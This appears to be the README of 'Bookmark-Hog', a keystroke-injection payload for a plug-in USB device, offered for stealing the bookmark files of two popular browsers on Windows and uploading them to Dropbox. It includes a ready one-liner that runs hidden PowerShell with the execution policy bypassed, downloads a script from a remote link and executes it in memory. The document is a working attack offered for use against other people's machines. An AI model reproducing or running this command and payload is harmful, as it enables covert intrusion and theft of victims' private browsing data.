# Bookmark-Hog

A payload to exfiltrate bookmarks of the 2 most popular browsers

## Description

This payload will enumerate through the browser directories, looking for the file that stores the bookmark history

These files will be saved to the temp directory

Finally dropbox will be used to exfiltrate the files to cloud storage

## Getting Started

### Dependencies

* DropBox or other file sharing service - Your Shared link for the intended file
* Windows 10,11

### Executing program

* Plug in your device
* Invoke-WebRequest will be entered in the Run Box to download and execute the script from memory

powershell -w h -NoP -NonI -ep Bypass $pl = iwr < Your Shared link for the intended file> ?dl=1; iex $pl


## Contributing

All contributors names will be listed here

atomiczsec
I am Jakoby

## Acknowledgments

* [Hak5]
* [I-Am-Jakoby]